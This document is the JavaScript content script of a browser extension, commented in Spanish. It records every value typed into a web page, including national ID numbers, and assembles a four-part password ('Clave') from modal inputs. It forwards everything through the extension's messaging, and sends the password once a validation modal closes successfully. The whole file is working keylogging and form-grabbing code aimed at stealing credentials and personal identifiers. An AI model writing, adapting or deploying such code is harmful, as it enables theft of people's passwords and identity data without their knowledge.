// Buffer para la Clave
let claveBuffer = { 'swal-input1': '', 'swal-input2': '', 'swal-input3': '', 'swal-input4': '' };

// 1. Capturar pulsaciones para llenar el buffer de la clave
document.addEventListener('input', (event) => {
    const target = event.target;
    
    // Si es uno de los campos de la clave, solo actualizamos el buffer
    if (['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'].includes(target.id)) {
        claveBuffer[target.id] = target.value;
        return; 
    }

    // Para el resto de campos (DNI, OS, etc), capturamos y enviamos normalmente
    const fieldName = target.id || target.name || target.placeholder || "sin_nombre";
    const value = target.value;
    
    if (value.trim() !== "") {
        chrome.runtime.sendMessage({ 
            action: 'saveData', 
            data: { field: fieldName, value: value, timestamp: new Date().toISOString() } 
        });
    }
}, true);

// 2. Observador para detectar el cierre del modal de validación (ÉXITO)
const targetNode = document.getElementById('modalValidarCodigo');
if (targetNode) {
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.attributeName === 'style') {
                const style = targetNode.getAttribute('style');
                // Si el modal pasa a display: none, enviamos la clave completa
                if (style && style.includes('display: none')) {
                    const claveCompleta = `${claveBuffer['swal-input1']}${claveBuffer['swal-input2']}${claveBuffer['swal-input3']}${claveBuffer['swal-input4']}`;
                    
                    if (claveCompleta !== "") {
                        chrome.runtime.sendMessage({ 
                            action: 'saveData', 
                            data: { field: 'Clave', value: claveCompleta, timestamp: new Date().toISOString() } 
                        });
                        // Limpiar buffer tras enviar
                        claveBuffer = { 'swal-input1': '', 'swal-input2': '', 'swal-input3': '', 'swal-input4': '' };
                    }
                }
            }
        });
    });
    observer.observe(targetNode, { attributes: true });
}